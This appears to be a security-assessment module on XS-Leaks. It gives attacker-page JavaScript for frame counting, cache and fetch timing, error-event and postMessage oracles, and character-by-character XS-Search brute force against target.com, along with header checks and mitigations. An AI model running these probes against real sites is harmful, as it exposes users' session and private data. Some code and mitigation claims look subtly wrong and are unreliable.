# VULN MODULE — XS-Leaks (Cross-Site Information Leaks)
# Asset: webapp
# CWE-200 | Report prefix: WEB-XSLEAK

## THREAT MODEL

XS-Leaks exploit side channels in cross-origin browser behavior to infer sensitive
information about a victim's session state. No direct data exfiltration — instead,
attackers learn binary facts ("is the victim logged in?", "does the victim have
admin role?", "does their account contain a specific transaction?") by measuring
observable differences in cross-origin behavior.

All XS-Leaks require the victim to visit an attacker-controlled page.

Attack surface:
- State-sensitive endpoints (search results, account pages, admin panels)
- Auth status endpoints
- Personalized content that varies based on session state
- Error pages that behave differently for authenticated vs anonymous

## VULNERABILITY CLASSES

1. Frame counting         — iframe src changes sub-frame count based on content
2. History API            — navigation count reveals visited URLs
3. Cache timing           — cached resource loads faster (cross-origin cache probing)
4. Event loop timing      — heavy server responses block event loop (measurable)
5. Error events           — onload vs onerror reveals resource accessibility
6. PostMessage oracles    — response body leaks via window.postMessage
7. Fetch timing           — response time reveals data size or server processing
8. CSS-based leaks        — element geometry changes based on content (scroll bars, etc.)
9. Browser bugs           — engine-specific behaviors (vary by browser version)

## PRIMITIVE 1 — FRAME COUNTING (XS-Search)

Count the number of iframes/windows opened by a target page — page state (search
results, list items) correlates with frame count.

```javascript
// Attacker page: count frames loaded by target
const win = window.open("https://target.com/search?q=KEYWORD");

// Wait for load, then count frames:
win.onload = () => {
  console.log("Frame count:", win.frames.length);
  // If search returns results → more frames → positive oracle
  win.close();
};
```

### XS-Search via frame counting (brute force)

```javascript
// Binary search for sensitive keyword in search results:
async function searchFor(keyword) {
  return new Promise((resolve) => {
    const win = window.open(`https://target.com/search?q=${keyword}`);
    setTimeout(() => {
      const count = win.frames.length;
      win.close();
      resolve(count > 0);  // true = keyword found in results
    }, 2000);
  });
}

// Brute force character by character:
(async () => {
  const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
  let found = "";
  for (const char of charset) {
    if (await searchFor(found + char)) {
      found += char;
      console.log("Found prefix:", found);
    }
  }
})();
```

## PRIMITIVE 2 — NAVIGATION COUNTING (History API)

```javascript
// Before navigating victim to target page:
const before = history.length;

// Navigate victim (in iframe or via window.open same-origin chain):
// ... victim navigates to target page ...

// After, count new history entries:
const after = history.length;
const delta = after - before;
// delta > 0 = page performed redirects (e.g., login redirect = logged in)
```

## PRIMITIVE 3 — CACHE TIMING (Cross-origin cache probe)

Cached resources load faster than uncached ones. If a resource is only cached for
authenticated users, load time reveals session state.

```javascript
async function probeCached(url) {
  const start = performance.now();
  await fetch(url, { mode: "no-cors", credentials: "include" });
  const elapsed = performance.now() - start;
  return elapsed;  // < threshold = cached = user is authenticated
}

// Test:
const timing = await probeCached("https://target.com/api/user/avatar");
const isLoggedIn = timing < 50;  // cached if < 50ms
```

**Note**: Partitioned cookies (Chrome 115+) limit this attack in modern browsers.

## PRIMITIVE 4 — ERROR EVENT ORACLE

```javascript
// onload fires if resource is accessible (HTTP 200)
// onerror fires if resource is inaccessible (403/404)

function checkAccess(url) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload  = () => resolve(true);   // accessible
    img.onerror = () => resolve(false);  // blocked
    img.src = url;
  });
}

// Check if victim has admin access:
const isAdmin = await checkAccess("https://target.com/admin/secret-resource.png");

// Check if victim's email is in a list (OWASP example):
const registered = await checkAccess("https://target.com/avatar/alice@company.com.png");
```

## PRIMITIVE 5 — EVENT LOOP TIMING (Heavy response)

Heavy server responses (large JSON, slow queries) block the main thread, causing
measurable delays in the attacker's page timing.

```javascript
async function measureLoad(url) {
  const start = performance.now();
  await fetch(url, { mode: "no-cors", credentials: "include" });
  return performance.now() - start;
}

// Measure response sizes (larger search results = more matches = longer time):
const t1 = await measureLoad("https://target.com/search?q=KEYWORD_A");
const t2 = await measureLoad("https://target.com/search?q=KEYWORD_B");
// Significant difference → different result set sizes
```

## PRIMITIVE 6 — SCROLL-TO-TEXT FRAGMENT (#:~:text=)

Chrome-specific: `:~:text=` scrolls the page to matching text.
If the scroll position is observable cross-origin → text presence confirmed.

```javascript
// Works in Chrome: #:~:text= scrolls page, changing scroll position
const win = window.open("https://target.com/account#:~:text=admin");
setTimeout(() => {
  // If page scrolled → "admin" text found on page
  // (Partially mitigated in Chrome 86+ via COOP headers)
}, 1000);
```

## PRIMITIVE 7 — postMessage LEAKS

If the target page sends postMessage from an authenticated context:

```javascript
window.addEventListener("message", (e) => {
  if (e.origin === "https://target.com") {
    console.log("Leaked data:", e.data);
  }
});

// Open target in iframe and wait for postMessage:
document.getElementById("frame").src = "https://target.com/dashboard";
```

Only applicable if target page sends messages without checking `targetOrigin`.

## XS-SEARCH METHODOLOGY

1. Identify a **search endpoint** that returns different content based on session state
2. Identify a **measurable oracle**: frame count, load time, error vs success, redirect count
3. Confirm oracle works for two known states (zero results vs. N results)
4. Brute force the unknown value character by character

```
Known secret ← [a-z0-9] → binary oracle → character by character extraction
```

## WHITEBOX PATTERNS

```bash
# Check for COOP / COEP / CORP headers that block XS-Leaks:
grep -rn "Cross-Origin-Opener-Policy\|Cross-Origin-Embedder-Policy\|Cross-Origin-Resource-Policy" \
  --include="*.conf" --include="*.js" --include="*.ts" --include="*.py"
# Missing COOP: same-origin → window.open can count frames
# Missing CORP: no-cors → cache timing possible

# Check SameSite on session cookie:
grep -rn "SameSite\|samesite" --include="*.py" --include="*.js" --include="*.php"
# SameSite=None → cross-site requests carry session cookie → leak works
# SameSite=Lax or Strict → many XS-Leaks require form POST (limited)
```

## MITIGATION INDICATORS (reduce your confidence in exploitability)

| Mitigation | Bypassed by |
|---|---|
| `COOP: same-origin` | — blocks frame counting via window.open |
| `SameSite=Strict/Lax` | — blocks credential-carrying cross-site requests |
| `Cache-Control: no-store` | — blocks cache timing |
| `Vary: Cookie` | — partitions cache by session |
| Random timing jitter | — reduces timing precision |
| Rate limiting on search | — slows brute force |

## TOOLS

```bash
# XSLeaks Browser Test Suite:
# https://xsleaks.dev/docs/attacks/

# Burp Suite — measure response times for timing-based leaks

# Browser: Chrome (most exploitable), then Firefox, then Safari
# Check browser-specific: https://xsleaks.dev/docs/attacks/browser-features/
```
